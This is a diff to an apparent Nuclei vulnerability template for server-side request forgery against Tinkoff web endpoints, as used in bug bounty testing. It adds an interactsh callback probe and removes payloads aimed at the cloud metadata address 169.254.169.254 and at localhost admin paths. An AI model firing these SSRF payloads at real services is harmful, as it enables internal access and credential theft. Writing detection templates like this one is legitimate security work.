@@ -4,36 +4,35 @@ info:
   name: Tinkoff - Server-Side Request Forgery
   author: bugbounty
   severity: critical
-  description: SSRF via origin, utm_source, and API parameters
+  description: SSRF via origin parameter with interactsh validation
   tags: ssrf,tinkoff
+  reference:
+    - https://portswigger.net/web-security/ssrf
 
 http:
   - raw:
       - |
-        GET /api/common/v1/session_info?platform=web&sessionid=test&origin=http://{{interactsh-url}} HTTP/1.1
+        GET /api/common/v1/session_info?platform=web&sessionid=test&origin=http://{{interactsh-url}}/callback HTTP/1.1
         Host: {{Hostname}}
+        Accept: application/json
 
-      - |
-        GET /api/common/v1/mobile_info?platform=android&origin=http://169.254.169.254/latest/meta-data/ HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /cards/debit-cards/tinkoff-black/?utm_source=http://{{interactsh-url}}/ssrf HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /invest/stocks?utm_source=http://localhost:8080/admin HTTP/1.1
-        Host: {{Hostname}}
-
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "http"
-          - "dns"
+
+      - type: status
+        status:
+          - 200
+          - 201
+          - 301
+          - 302
 
     extractors:
       - type: regex
+        name: interaction
         part: interactsh_request
         regex:
-          - '([a-z0-9]+\.interact\.sh)'
+          - '([a-z0-9\-]+)\.([a-z0-9]+)\.interact\.sh'
